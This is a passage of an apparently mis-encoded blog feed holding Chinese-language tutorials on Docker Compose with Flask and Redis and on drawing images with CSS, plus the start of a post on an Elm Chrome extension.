 FROM python:3.4-alpine # å¾ python3.4 åŸºç¤ä¸ŠåŠ å·¥ADD . /code # å°‡æœ¬åœ°ç«¯ç¨‹å¼ç¢¼è¤‡è£½åˆ° container è£¡é¢ ./code è³‡æ–™å¤¾WORKDIR /code # container è£¡é¢çš„å·¥ä½œç›®éŒ„RUN pip install -r requirements.txtCMD [&quot;python&quot;, &quot;app.py&quot;]

ç”¨ Docker Compose file æè¿° services é‹ä½œç‹€æ³ï¼Œæˆ‘å€‘çš„å°ˆæ¡ˆå…±æœ‰ web å’Œ redis å…©å€‹ service
 version: &#x27;3&#x27;services:web:    build: .    ports:    - &quot;5000:5000&quot;    volumes:    - .:/code # æŠŠç•¶å‰è³‡æ–™å¤¾ mount æ›è¼‰é€²å» containerï¼Œé€™æ¨£ä½ å¯ä»¥ç›´æ¥åœ¨æœ¬åœ°ç«¯å°ˆæ¡ˆè³‡æ–™å¤¾æ”¹å‹•æª”æ¡ˆï¼Œcontainer è£¡é¢çš„æª”æ¡ˆä¹Ÿæœƒæ›´å‹•ä¹Ÿä¸ç”¨é‡æ–° build imageï¼redis:    image: &quot;redis:alpine&quot; # å¾ Docker Hub registry ä¾†çš„ image

ç”¨ Docker Compose åŸ·è¡Œä½ çš„ Web appï¼ˆ-d detached æ˜¯åœ¨èƒŒæ™¯åŸ·è¡Œï¼Œå¯ä»¥ä½¿ç”¨ $ docker ps -a è§€çœ‹ç›®å‰æ‰€æœ‰ docker container ç‹€æ³ï¼Œä½¿ç”¨ $ docker-compose ps è§€çœ‹ docker-compose process ç‹€æ³ï¼‰
 $ docker-compose up -d

 è‹¥è¦çµ‚æ­¢ä¸¦ç§»é™¤ container å‰‡å¯ä»¥ä½¿ç”¨ $ docker-compose down

åˆ° http://127.0.0.1:5000/ è§€çœ‹æˆæœ



ç¸½çµä»¥ä¸Šé€é Docker Compose ä¾†å•Ÿå‹•ä¸¦åŸ·è¡Œ Python Flask + Redis ç¶²é äººæ•¸çµ±è¨ˆçš„å°ˆæ¡ˆï¼Œè®“è®€è€…èƒ½å¤ ç†è§£ Docker Compose çš„å„ªå‹¢å’Œä½¿ç”¨æ–¹å¼ï¼ˆDocker Compose æ˜¯ä¸€å€‹å·¥å…·å¯ä»¥è®“ä½ å¯ä»¥é€éä¸€å€‹æŒ‡ä»¤å°±å¯ä»¥æ§åˆ¶æ‰€æœ‰å°ˆæ¡ˆï¼ˆprojectï¼‰ä¸­æ‰€éœ€è¦çš„ servicesï¼‰ã€‚åŒæ™‚ä¹Ÿè¤‡ç¿’äº† Dockerfileã€Docker Imageã€Container ç›¸é—œçŸ¥è­˜ã€‚Yaï¼Œè‡ªå¾æœ‰äº† Docker Compose åœ¨æœ¬åœ°é–‹ç™¼æ¸¬è©¦å°ˆæ¡ˆæ›´åŠ æ–¹ä¾¿ï¼Œè€ƒè©¦éƒ½è€ƒä¸€ç™¾åˆ†äº†ï¼
åƒè€ƒæ–‡ä»¶
Get started with Docker Compose
æ·±å…¥æ·ºå‡º Dockerfile èˆ‡ Docker Compose
éƒ¨ç½²Docker Composeã€€å¯¦ä¾‹ç¤ºç¯„å®šç¾©æª”æ’°å¯«
Docker Compose åˆæ­¥é–±è®€èˆ‡å­¸ç¿’è¨˜éŒ„

ï¼ˆimage via cuelogicã€Zabbixï¼‰
é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:)
]]></content>
      <tags>
        <tag>docker</tag>
        <tag>å®¹å™¨</tag>
        <tag>docker machine</tag>
        <tag>docker compose</tag>
        <tag>docker swarm</tag>
        <tag>vm</tag>
      </tags>
  </entry>
  <entry>
    <title>ç”¨ CSS ç•«ç•«çš„å°æŠ€å·§</title>
    <url>/2017/11/17/drawing-css-image/</url>
    <content><![CDATA[å‰è¨€æˆ‘æƒ³æ¯å€‹äººå°æ™‚å€™æ‡‰è©²éƒ½è »å–œæ­¡ç•«ç•«çš„å§ï¼Ÿåœ¨æ²’æœ‰éŠæˆ²æ©Ÿã€æ²’æœ‰ iPhone çš„å¹´ä»£ï¼Œæ‹¿è‘—ç•«ç­†è·Ÿä¸€å¼µç´™å°±å¯ä»¥é–‹å¿ƒåº¦éå¹¾å€‹å°æ™‚ï¼Œä½†ä¸çŸ¥é“å¾ä»€éº¼æ™‚å€™é–‹å§‹å°±å¿˜æ‰äº†é€™ä»½å¿«æ¨‚ã€‚
ä»Šå¤©æƒ³é‚€è«‹å¤§å®¶æŠŠã€å¿«æ¨‚ã€æ‰¾å›ä¾†ï¼
èº«ç‚ºå·¥ç¨‹å¸«ï¼Œæˆ‘å€‘æ‹¿èµ·ç•«ç­†å¯èƒ½ç•«ä¸å‡ºä¸€å€‹æ¼‚äº®çš„åœ“ï¼Œä½†é€éç†Ÿæ‚‰çš„ CSS æˆ‘å€‘å¯ä»¥åšåˆ°ã€‚
ã€ç­‰ç­‰ï¼Œå¹³å¸¸ä¸Šç­èª¿ CSS å°±å·²ç¶“å¤ è€—ç¥äº†ï¼Œä½ é‚„è¦æ‹¿ä¾†ç•«åœ–ï¼Ÿé€™é™¤äº†ç‚«æŠ€ä»¥å¤–ï¼Œå°å°ˆæ¥­èƒ½åŠ›æœ‰ä»€éº¼å¯¦è³ªå¹«åŠ©å—ï¼Ÿä½ çœ‹é€£çŸ¥ä¹ä¸Šä¹Ÿæœ‰äººé€™æ¨£æƒ³ã€‚ã€
é‚£ä½ æ»‘ ig å°å°ˆæ¥­èƒ½åŠ›æœ‰ä»€éº¼å¯¦è³ªå¹«åŠ©å—ï¼Ÿ
å¨ï½è©±ä¸æ˜¯é€™æ¨£è¬›ï¼Œä¼‘é–’æ´»å‹•æ˜¯å¾ˆé‡è¦çš„ï¼Œä»¥å·¥ä½œä¸Šä¾†èªªï¼Œéœ€è¦åœ–ç‰‡æ™‚ï¼Œç•¶ç„¶é‚„æ˜¯å‡º SVG åœ–æª”æ¯”è¼ƒæœ‰æ•ˆç‡ï¼Œæ•ˆæœä¹Ÿè¼ƒå¥½ï¼Œä½†æ˜¯é€é CSS ç•«åœ–æœ‰å¹¾å€‹æˆ‘å€‹äººèªç‚ºè »é‡è¦çš„å¥½è™•ï¼š

è®“ä½ å° CSS çš„ Layout ä½ˆå±€ã€style å±¬æ€§çš„æ“ä½œæ›´åŠ ç†Ÿæ‚‰

é€éé€™ç¨®å¨›æ¨‚æ€§è³ªçš„ç·´ç¿’ï¼ŒåŸ¹é¤Šå° CSS æŒæ§æ€§çš„è‡ªä¿¡ï¼Œæ‰¾å›å°å·¥ä½œèˆ‡æŠ€è¡“çš„æ„›

å·¥ä½œç¸½æ˜¯æœƒé‡åˆ°éœ€è¦æ”¯æ´èˆŠç‰ˆç€è¦½å™¨çš„ç‹€æ³å§ï¼Ÿå¾ˆå¤šæ–°ç©æ„å…’ä½ ç„¡æ³•åœ¨å·¥ä½œä¸­ä½¿ç”¨ï¼Œé‚£å°±é€éé€™ç¨®æ©Ÿæœƒå¥½å¥½æŠŠç©ä¸€ä¸‹å§ï½


è¨“ç·´æ‹†è§£é é¢æ¨¡çµ„çš„èƒ½åŠ›

åœ¨ codepen ä¸Šè‡¨æ‘¹ä»–äººè‘—ä½œæ™‚ï¼Œå¯ä»¥æƒ³æƒ³å¦‚æœæ˜¯ä½ ï¼Œæœƒæ€éº¼çµ„ç¹”ä½ çš„å…ƒç´ ï¼Œç„¶å¾Œå†è·Ÿä½œè€…æ¯”å°çœ‹çœ‹èª°çš„ä½œæ³•æ›´æ£’ï¼


é›éŠåœ¨æœ‰é™è³‡æºä¸‹ç™¼å±•å‡ºç„¡é™å‰µé€ åŠ›ï¼Œå°±åƒæéº¥å…‹ä¸€èˆ¬ã€‚

é€™é»æ˜¯æˆ‘è¦ºå¾—æœ€æœ‰è¶£çš„ï¼Œåœ¨ CSS æœ‰é™çš„èƒ½åŠ›ä¸‹ï¼Œä½ è¦æƒ³è¾¦æ³•æ‰¾å‡ºæ–¹æ³•ä¾†å¯¦ä½œæƒ³è¦çš„æ•ˆæœï¼Œä¸çŸ¥ä¸è¦ºä¸­æœƒé›éŠä½ çš„æ€è€ƒèˆ‡è§£æ±ºå•é¡Œçš„èƒ½åŠ›ï¼
å¾ˆå¤šæ™‚å€™ä½ æœƒç™¼ç¾ï¼Œçœ‹ä¼¼è¤‡é›œçš„æ±è¥¿ï¼Œé€é CSS çš„ä¸€äº›ç°¡å–®å±¬æ€§ï¼Œå…¶å¯¦éå¸¸å®¹æ˜“ã€‚


ä½ å¯ä»¥é€é CSS å‹•ç•«è¼•æ˜“çš„ç¹ªè£½å‡ºå‹•æ…‹åœ–ç‰‡ï¼Œé€™å°±ä¸æ˜¯ä½ å–®ç´”ç•«ç­†èƒ½åšåˆ°çš„äº†ï¼


ä»Šå¤©å°±ä¾†ä»‹ç´¹å¹¾å€‹ç°¡å–®çš„å°æŠ€å·§ï¼Œè®“ä½ èƒ½ç”¨ CSS ç•«å‡ºå¦‚ä¸‹çš„åœ–ç‰‡ï¼ï¼ˆä»€éº¼ï¼Ÿä½ ä¸çŸ¥é“ Rick and Mortyï¼Ÿå…ˆå»çœ‹å†å›ä¾†ã€‚ï¼‰

çœ‹å¾—å‡ºä¾†æ˜¯ç”¨ CSS ç•«çš„å—ï¼Ÿ
Rick - pure cssåŸå§‹ç¢¼åœ¨æ­¤ï¼Œç”±æ–¼æ²’æœ‰è™•ç† RWDï¼Œæ‰€ä»¥å°±ä¸ç›´æ¥æ”¾éä¾†å•¦ï½
æ¥ä¸‹ä¾†æˆ‘æœƒå…ˆå¾ç¹ªåœ–çš„å·¥å…·é–‹å§‹ä»‹ç´¹èµ·ï¼Œæ¥è‘—æä¾›ä¸€äº›é¡è‰²æ­é…èˆ‡ç¹ªåœ–éˆæ„Ÿçš„è³‡æºï¼Œæœ€å¾Œé€²å…¥ä¸€é€£ä¸² CSS ç¹ªåœ–çš„æŠ€å·§ä»‹ç´¹ã€‚
ç¹ªåœ–å°å·¥å…·Pre-processorCSS ç•«åœ–çš„å…©å€‹ä¸»è¦å·¥å…·å°±æ˜¯ HTML èˆ‡ CSSï¼Œä½ ç•¶ç„¶å¯ä»¥ç›´æ¥ç”¨ä¸€èˆ¬çš„ HTML èˆ‡ CSS ä¾†è£½ä½œä½ çš„ Pure CSS imageï¼Œä½†æˆ‘æ¯”è¼ƒæ¨è–¦ä½¿ç”¨ Pug èˆ‡ SCSS å…©å€‹ pre-processor ä¾†å¹«åŠ©ä½ ã€‚
Pug å…¶å¯¦å°±æ˜¯ä»¥å‰ Nodejs çš„ Template engine Jade æ”¹åå¾Œçš„ç‰ˆæœ¬ï¼Œä»–èƒ½è®“ä½ åˆ©ç”¨ä¸‹é¢çš„æ–¹å¼ä¾†æ¶æ§‹ä½ çš„ HTMLï¼š
div.skydiv.rick    div.body    div.head

ç­‰åŒæ–¼ï¼š
&lt;div class=&quot;sky&quot;&gt;    &lt;div class=&quot;rick&quot;&gt;        &lt;div class=&quot;body&quot;&gt;&lt;/div&gt;        &lt;div class=&quot;head&quot;&gt;&lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;

çœ‹èµ·ä¾†ç°¡æ½”åˆçœäº†è¨±å¤šé‡è¤‡çš„æ‰“å­—ä½œæ¥­ã€‚
SCSS ç›¸ä¿¡å°±æ›´ä¸é™Œç”Ÿäº†ï¼Œé€é SCSSï¼Œä½ å¯ä»¥ç”¨æ›´ç›´è¦ºçš„æ–¹å¼ä¾†æ’°å¯« CSS éšå±¤ï¼Œä¸¦åˆ©ç”¨è®Šæ•¸ä¾†è®“ä½ çš„ css æ›´æœ‰å½ˆæ€§ï¼š
$rick-body-color = #DDD8D0;.rick &#123;    .body &#123;        background-color: $rick-body-color;    &#125;    &amp;:before &#123;        content: &quot;Rick&#x27;s body&quot;;        position: absolute;        width: 100px;        height: 100px;    &#125;&#125;

ç­‰åŒæ–¼ï¼š
.rick .body &#123;    background-color: #DDD8D0;&#125;.rick .body::before &#123;    content: &quot;Rick&#x27;s body&quot;;    position: absolute;    width: 100px;    height: 100px;&#125;

ç¹ªåœ–å¹³å°ä¸Šè¿°å…©å¥— pre-process åœ¨ codepenã€jsbin ç­‰å¹³å°ä¸Šéƒ½å¯ä»¥å¾ˆæ–¹ä¾¿çš„ä½¿ç”¨ï¼Œæˆ‘æ¨è–¦å¤§å®¶åˆ° Codepen ä¸Šé¢å»ç·´ç¿’ä¸¦ç™¼å¸ƒè‡ªå·±çš„ä½œå“ï¼ŒåŒæ™‚ä¹Ÿçœ‹çœ‹ä¸Šé¢çš„ç¥äººå€‘ï¼ˆçœŸçš„æ˜¯è¶…å¤šç¥äººâ€¦ï¼‰æ˜¯æ€éº¼ç©å¼„ CSS çš„ã€‚
Codepen ä¸Šæœ‰è¨±å¤š css çš„æ´»å‹•ï¼Œåƒæ˜¯ #Codevemberã€#DailyCSS ç­‰ç­‰ï¼Œé¼“å‹µå¤§å®¶æ¯å¤©åˆ° Codepen ä¸Šå±•ç¾è‡ªå·±çš„å‰µæ„èˆ‡èƒ½åŠ›ï¼Œæˆ‘å…¶å¯¦ä¹Ÿè »æƒ³åƒåŠ çš„ï¼Œä½†æ˜¯ Daily çœŸçš„å¤ªå›°é›£å“ˆå“ˆï¼Œå¦‚æœä¹Ÿæœ‰äººè·Ÿæˆ‘ä¸€æ¨£çš„æ„Ÿå—ï¼Œä¸å¦‚æˆ‘å€‘è‡ªå·±ä¾†å¼„å€‹ #WeeklyCSS å§ï¼
é¡è‰²é¸æ“‡å·¥å…·ç•¢ç«Ÿæˆ‘å€‘ä¸æ˜¯è¨­è¨ˆå¸«ï¼Œåœ¨é¡è‰²çš„æ•éŠ³åº¦ä¸Šå¯èƒ½æ¬ ç¼ºé›éŠï¼Œä½†æ²’é—œä¿‚å•Šï¼Œæˆ‘å€‘æ˜¯ç‚ºäº†ä¼‘é–’ã€ç‚ºäº†æŠŠæ„›æ‰¾å›ä¾†ã€‚
å¯ä»¥é€é coolors é€™å€‹ç¶²ç«™å¹«ä½ ç”¢ç”Ÿä¸€äº›å°æ‡‰çš„é¡è‰²çµ„åˆï¼Œæˆ–æ˜¯åˆ©ç”¨ Colorzilla ä¾†å¾åˆ¥äººé é¢å–å¾—ä½ çœ‹ä¸Šçœ¼çš„é¡è‰²ã€‚
éˆæ„Ÿä¾†æºå”¯ä¸€æ¨è–¦ dribbbleï¼Œè¨±å¤šäººéƒ½æœƒå¾ä¸Šé¢æ‰¾å°‹éˆæ„Ÿï¼Œç„¶å¾Œè½‰æˆ pure css çš„ç‰ˆæœ¬ï¼Œç”šè‡³æ˜¯åŠ ä¸Šå‹•ç•«æ•ˆæœï¼Œè®“åœ–ç‰‡æ´»èµ·ä¾†ã€‚
ä¹Ÿå¯ä»¥å» behance ä»¥åŠå‰›å‰›æåˆ°çš„ codepenï¼Œç•¶ç„¶é‚„æœ‰å…¶ä»–è¨±å¤šå¹³å°ï¼Œä½†æ˜¯æˆ‘è¦ºå¾—å…‰ Dribbble ä¸Šçš„åœ–å°±å¤ ä½ ç©äº†XD
CSS ç¹ªåœ–æŠ€å·§å¥½çš„ï¼Œçµ‚æ–¼è¦é€²å…¥ CSS ç¹ªåœ–çš„å¯¦æˆ°æŠ€å·§ã€‚åªè¦æŒæ¡ä½é€™é‚Šä»‹ç´¹çš„å°æ’‡æ­¥ï¼Œä½ å°±èƒ½ç¹ªè£½å‡ºå¦‚ç¯„ä¾‹ä¸€èˆ¬çš„ Pure CSS imageï¼
å–„ç”¨å„ç¨®å½¢ç‹€ç–ŠåŠ çµ„åˆå¤§å®¶éƒ½çŸ¥é“ HTML èˆ‡ CSS çš„åŸºæœ¬å½¢ç‹€å°±æ˜¯ä¸€å€‹å››å››æ–¹æ–¹çš„ boxï¼Œä½†æ˜¯æˆ‘å€‘å¯ä»¥é€éå¹¾ç¨®æ–¹å¼ã€Œè£½é€ ã€å‡ºå„ç¨®å½¢ç‹€ï¼š

æœ€å¸¸è¦‹çš„ä¸‰è§’å½¢ï¼š  å¦‚æœä½ å€‘æ›¾ç¶“æœ‰éœ€è¦è£½ä½œ ä¸‰è§’å½¢çš„ div çš„è©±ï¼Œæˆ–è¨±æœ‰çœ‹é css arrow please é€™å€‹ç¶²ç«™ï¼Œ  è‹¥ä»”ç´°ç ”ç©¶ä¸€ä¸‹ï¼Œä½ æœƒç™¼ç¾å®ƒçš„åŸç†å¾ˆç°¡å–®ï¼Œå°±æ˜¯åˆ©ç”¨å¯¬é«˜çš†ç‚º 0 çš„ div ä¸Šçš„ border å¯¬åº¦ä¾†åšè®ŠåŒ–ï¼Œèˆ‰ä¾‹ä¾†èªªï¼š  æˆ‘å€‘è‹¥è¨­ç½®ä¸€å€‹ div çš„å¯¬é«˜ï¼Œä»¥åŠå››é‚Šçš„é‚Šå¯¬ï¼Œæœƒå‘ˆç¾å¦‚ä¸‹æƒ…æ³ï¼š
  
  .rect &#123;    height:20px;    width:20px;    border-color:red blue yellow green;    border-style:solid;    border-width:20px;&#125;
  æ¥è‘—æˆ‘å€‘æŠŠ å¯¬ã€é«˜ éƒ½è¨­ç‚ºé›¶ï¼Œä¸å°±çœ‹åˆ°ä¸‰è§’å½¢äº†å—ï¼š
  
  .rect &#123;    height: 0px;    width: 0px;    border-color:red blue yellow green;    border-style: solid;    border-width: 20px;&#125;
  æ‰€ä»¥åªè¦ç•™ä¸‹ä¸€ç¨®é¡è‰²ï¼Œå°±æ˜¯æˆ‘å€‘è¦çš„çµæœäº†ï¼š
  
  .rect &#123;    height: 0px;    width: 0px;    border-color:red transparent transparent transparent;    border-style: solid;    border-width: 20px;&#125;
  [è©³ç´°ä»‹ç´¹å¯ä»¥çœ‹é€™é‚Šï¼Œé‚„æœ‰æ•™ä½ å¦‚ä½•æ”¯æ´åˆ° IE6ï¼](http://caibaojian.com/css-border-triangle.html)

ç¥å¥‡çš„ border ä¹‹ä¸æ˜¯åªæœ‰ä¸€ç¨®è§’åº¦ï¼š  é™¤äº†ç”¨ä¾†è£½ä½œä¸‰è§’å½¢ä»¥å¤–ï¼Œå¾ˆå¤šäººå¸¸å¸¸å¿½ç•¥ border å…¶å¯¦å¯ä»¥æ ¹æ“šå„ç¨®æ–¹ä½ä¾†èª¿æ•´ï¼Œåƒæ˜¯ border-top-left-radius æˆ–æ˜¯ border-left-widthï¼Œèˆ‰ä¾‹ä¾†èªªï¼ŒRick èº«ä¸Šè¥¯è¡«çš„è¡£é ˜ï¼Œæˆ‘å€‘å¯ä»¥é€™æ¨£åšï¼š
  .shirt &#123;    border-bottom-right-radius: 100%;    border-right: 3px solid #666;    top: 25px;    left: 0;    position: absolute;    background-color: white;    width: 10px;    height: 40px;&#125;

  

  é€é border-bottom-right-radius å°±å¯ä»¥æœ‰ä¸€å€‹å°æ‹¬å¼§çš„æ•ˆæœã€‚

å †ç–Šçµ„åˆï¼š  ä»¥å‰é¢ Rick çš„ç¯„ä¾‹ä¾†çœ‹ï¼Œä»–çš„é ­é«®éƒ¨åˆ†å°±å¯ä»¥æœ‰å¾ˆå¤šç¨®å¯¦ä½œæ–¹å¼ï¼Œä½ å¯èƒ½æœƒæƒ³ä½¿ç”¨å‰›å‰›ä»‹ç´¹çš„ä¸‰è§’å½¢ï¼ŒåŠ ä¸Š transform: rotate()ï¼Œçµ„åˆå‡ºå…¶é›œäº‚æœ‰å‹çš„é ­é«®ï¼Œä½†æˆ‘å¤ªæ‡¶äº†ï¼Œç›´æ¥ç”¨ div ä¾†å †ç–Šçµ„åˆï¼š
  
  å †ç–Šçµ„åˆæœ‰æ™‚å€™éœ€è¦æ­é… overflow:hiddenï¼Œåƒæ˜¯ Rick çš„å˜´å·´ï¼Œå°±æ˜¯é€éå¤–å±¤è¨­å®š overflowï¼Œä¸¦æ­é…é©ç•¶è§’åº¦çš„ border-radiusï¼Œæ‰èƒ½è£½ä½œå‡ºé€™ç¨®å¼§åº¦çš„æ•ˆæœï¼š
  
  
css clip-path:  è‹¥æ˜¯çœŸçš„æƒ³è¦æœ‰å¤šé‚Šå½¢ï¼Œå¯ä»¥ä½¿ç”¨ clip-pathã€‚  clip-path æ˜¯åŸæœ¬å°±å­˜åœ¨æ–¼ SVG ä¸­çš„ä¸€å€‹å±¬æ€§ï¼Œè®“æˆ‘å€‘èƒ½åˆ©ç”¨é®ç½©çš„æ–¹å¼ä¾†è£åˆ‡å‡ºå¤šé‚Šå½¢ï¼Œåœ¨ç”¨ css ç•«åœ–çš„æ™‚å€™ï¼ŒåŸºæœ¬ä¸Šå°±ä¸è¦ç®¡ç€è¦½å™¨æ”¯æ´åº¦äº†å§ï¼Œå¤§è†½ç”¨ä¸‹å»å°±å°äº†ï¼é€™é‚Šæä¾›å¹¾å€‹è³‡æºè®“æœ‰èˆˆè¶£çš„äººå†å»ç ”ç©¶ä¸€ä¸‹ï¼š  Clip path generator  Clip path è©³ç´°ä»‹ç´¹  Can I use clip-path


å½å…ƒç´  Before &amp; after æ˜¯æœ€ä½³å¹«æ‰‹å½å…ƒç´ åœ¨ CSS ç¹ªåœ–ç•¶ä¸­ä½”æ“šçš„è§’è‰²çœŸæ˜¯å¤ªé‡è¦äº†ï¼Œé€é before èˆ‡ after çš„æ“ä½œï¼Œä½ å¯ä»¥æ›´æœ‰çµ„ç¹”çš„ä¾†ç®¡ç†å…ƒç´ ï¼Œä»¥ Rick çš„çœ¼ç›ä¾†èªªï¼Œæˆ‘å€‘å¯ä»¥å…ˆç•«å‡ºä¸€å€‹åœ“å½¢ï¼Œåœ¨é€é before å’Œ after å…©å€‹å½å…ƒç´ ä¾†ç”¢ç”Ÿ â€œçœ¼çš®â€ èˆ‡ â€œé»‘çœ¼çƒâ€ï¼š

.right-eye, .left-eye &#123;    position: relative;    float: left;    box-sizing: border-box;    width: 80px;    height: 80px;    border-radius: 50%;    border: 2px solid $rick--border;    background-color: #fff;    &amp;:before &#123;        // çœ¼çš®    &#125;    &amp;:after &#123;        // çœ¼çƒ    &#125;&#125;

é€é å½å…ƒç´ ï¼Œæˆ‘å€‘å¯ä»¥æŠŠç›¸é—œçš„å…ƒç´ ç¶å®šåœ¨ä¸€èµ·ï¼Œä¹Ÿå°‘äº†ä¸€äº› div çš„å®£å‘Šï¼Œå°æ–¼ Layout ä¸Šçš„èª¿æ•´ä¾†èªªä¹Ÿæ›´åŠ æ–¹ä¾¿ï¼Œå› æ­¤ä¸€å®šè¦å–„åŠ åˆ©ç”¨é€™å€‹ç‰¹æ€§ï¼
box-shadow èˆ‡ background-image çµ¦äºˆçš„å¦ç¨®å¯èƒ½æ€§æœ‰äº†ä¸Šè¿°çš„çŸ¥è­˜ï¼ŒåŸºæœ¬ä¸Šä½ è¦æ¹Šå‡ºä¸€å€‹ Rick æˆ–æ˜¯ Morty éƒ½æ˜¯æ²’å•é¡Œçš„ï¼Œä¸éé‚„æœ‰å€‹å°æŠ€å·§æƒ³ä»‹ç´¹çµ¦å¤§å®¶ï¼Œå°±æ˜¯ box-shadow èˆ‡ background-imageã€‚
é¦–å…ˆæ˜¯ box-shadowï¼Œæ˜¯æˆ‘è¦ºå¾—æœ€é…·çš„ä¸€å€‹æ±è¥¿ï¼Œåˆ©ç”¨ box-shadowï¼Œæˆ‘å€‘å¯ä»¥åªç”¨ä¸€å€‹ div å°±åšå‡ºå„ç¨®åœ–æ¡ˆï¼Œåƒæ˜¯ Calendar Iconï¼š æˆ–æ˜¯æ£‹ç›¤ï¼šJS Bin on jsbin.com
é‹ç”¨ box-shadow èˆ‡ background-image çš„åŸç†éƒ½æ˜¯åˆ©ç”¨åˆ°å¯ä»¥è¨­å®šå¤šå€‹å€¼çš„ç‰¹æ€§ï¼Œä»¥ä¸Šé¢çš„æ£‹ç›¤ç‚ºä¾‹å­ï¼Œ4 x 4 çš„æ£‹ç›¤æœ‰ 16 å€‹æ–¹å¡Šï¼Œæ‰£é™¤æ‰æœ¬èº« div ä½”æ“šçš„ä¸€å€‹ï¼Œä½ éœ€è¦è¨­å®š 15 å€‹ box-shadow çš„å€¼ï¼š 10px 0 0 #f00, ä»£è¡¨åœ¨ X offset 10px, Y offset 0px çš„ä½ç½®æœ‰ä¸€å€‹ #f00 çš„æ–¹å¡Šï¼ˆblur èˆ‡ spread ç‚º 0ï¼‰ï¼Œä¾æ­¤é¡æ¨å»çµ„å‡ºæ£‹ç›¤ã€‚
æ‡‚å¾—åŸç†ä»¥å¾Œï¼Œæ…¢æ…¢å°±å¯ä»¥è£½ä½œå‡ºæ›´è¤‡é›œçš„æ•ˆæœï¼Œåƒæ˜¯ Rick ç¯„ä¾‹ä¸­çš„åå­—ï¼Œæ¯ä¸€å€‹å­—æ¯å°±æ˜¯ä¸€å€‹ div å»é€é box-shadow çµ„æˆçš„ï¼š

background-image åœ¨æˆ‘é€™æ¬¡çš„ç¯„ä¾‹ä¸­æ²’æœ‰ä½¿ç”¨åˆ°ï¼Œä½†åŸºæœ¬åŸç†å·®ä¸å¤šï¼Œå¯ä»¥çœ‹é€™é‚Šçš„ç¯„ä¾‹ï¼š
See the Pen Pure CSS  Hotdog   ğŸŒ­ by yumeeeei (@yumeeeei) on CodePen.


ç¸½çµç”¨ CSS ç•«åœ–å¯¦éš›ä¸Šæ˜¯å€‹è »è¾›è‹¦çš„äº‹æƒ…ï¼Œä½†å°±å¦‚æˆ‘å…ˆå‰æ‰€èªªï¼Œå¯ä»¥è¨“ç·´åˆ°å¾ˆå¤šæ€è€ƒèƒ½åŠ›ä»¥åŠå‰µæ„ç™¼æƒ³ï¼Œæ›´é‡è¦çš„æ˜¯ï¼Œç•¶ä½ ç”¨ä¸€äº›å¾ˆç‰¹åˆ¥çš„æŠ€å·§ä¾†é”æˆä½ æƒ³è¦çš„æ•ˆæœæ™‚ï¼Œæˆå°±æ„Ÿæ˜¯éå¸¸å¤§çš„å•Šï½ï½
æˆ‘ä¹Ÿé‚„åœ¨åŠªåŠ›ä¸­ï¼Œæœ‰èˆˆè¶£çš„è©±å°±è·Ÿæˆ‘ä¸€èµ·ä¾† #WeeklyCSS å§ï¼
è³‡æ–™ä¾†æº
æ„›ï¼Œå¯æ›¾è¨˜å¾— - Paul Li
How I started drawing CSS Images
Pure-CSS-Hotdog
Clip path generator
Clip path è©³ç´°ä»‹ç´¹
Can I use clip-path
Class: how-to-make-pure-css-images

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>css</tag>
        <tag>drawing</tag>
      </tags>
  </entry>
  <entry>
    <title>åˆ©ç”¨ Elm è£½ä½œ Chrome Extension</title>
    <url>/2019/04/22/elm-chrome-extension/</url>
    <content><![CDATA[å‰è¨€ç›´æ¥å…ˆä¾†å€‹æˆæœåœ–ï¼š

ä»Šå¹´äºŒæœˆç§»è½‰é™£åœ°åˆ°æ—¥æœ¬ä¾†å·¥ä½œï¼Œæ¬åˆ°ä¸€å€‹äººç”Ÿåœ°ä¸ç†Ÿçš„åœ°æ–¹ï¼Œåˆå§‹é–‹éŠ·å°‘ä¸äº†ï¼Œé™¤äº†äº¤é€šã€ä¼™é£Ÿã€æˆ¿ç§Ÿå¤–ï¼Œé‚„éœ€è¦æ·»è³¼è¨±å¤šå‚¢ä¿±ã€‚è€Œç•¶ç„¶ï¼Œæ‰€æœ‰æ±è¥¿éƒ½æ˜¯ä»¥æ—¥å¹£æ¨™åƒ¹ï¼Œå°±ç®— Amazon JP å·²ç¶“éå¸¸æ–¹ä¾¿çš„æœ‰ç°¡é«”ç‰ˆçš„èªç³»å¯ä»¥åˆ‡æ›ï¼Œåƒ¹æ ¼ä¸Šé‚„æ˜¯å¾—ä»¥æ—¥å¹£é¡¯ç¤ºã€‚
å°æˆ‘ä¾†èªªï¼Œé‚„æ²’æœ‰è¾¦æ³•ç¿’æ…£ä»¥æ—¥å¹£ä¾†è¡¡é‡ç‰©å“çš„åƒ¹å€¼ï¼Œåƒæ˜¯æˆ‘èƒ½å¾ˆå¿«çŸ¥é“ä¸€åƒæ—¥å¹£å¤§ç´„ä¸‰ç™¾å°å¹£ï¼Œä½†çœ‹åˆ°ä¸€å€‹æ±è¥¿æ¨™åƒ¹å…©è¬ä¹æ—¥å¹£ï¼Œæˆ‘æ²’è¾¦æ³•å¾ˆå¿«é€Ÿçš„ç†è§£é€™æ±è¥¿æ˜¯å¤šè²´æˆ–å¤šä¾¿å®œï¼Œè…¦è¢‹é‚„æ˜¯æœƒæƒ³æŠŠå®ƒè½‰æˆå°å¹£ä¾†è¡¡é‡ã€‚
æ‰€ä»¥å°±é€ æˆæˆ‘åœ¨ Amazon JP æˆ–æ˜¯ Nitori çš„ç¶²ç«™æŒ‘é¸å•†å“æ™‚ï¼Œå¸¸å¸¸è¦è¤‡è£½åƒ¹æ ¼ï¼Œç„¶å¾Œé–‹å•Ÿå¦ä¸€å€‹ tab ä¾†æœå°‹æ—¥å¹£è½‰æ›å°å¹£çš„ç¶²ç«™ï¼Œå†å¡«å…¥è½‰æ›ã€‚
ä¸€æ¬¡å…©æ¬¡é‚„å¥½ï¼Œç¬¬ä¸‰æ¬¡å°±ç„¡æ³•å¿å—äº†ï¼Œå¼•ç”¨ â€œRefactoringâ€Šâ€”â€ŠImproving the Design of Existing Codeâ€ é€™æœ¬æ›¸ä¸­çš„ä¸€å¥è©±ï¼š*â€Three strikes, then you refactor.â€*
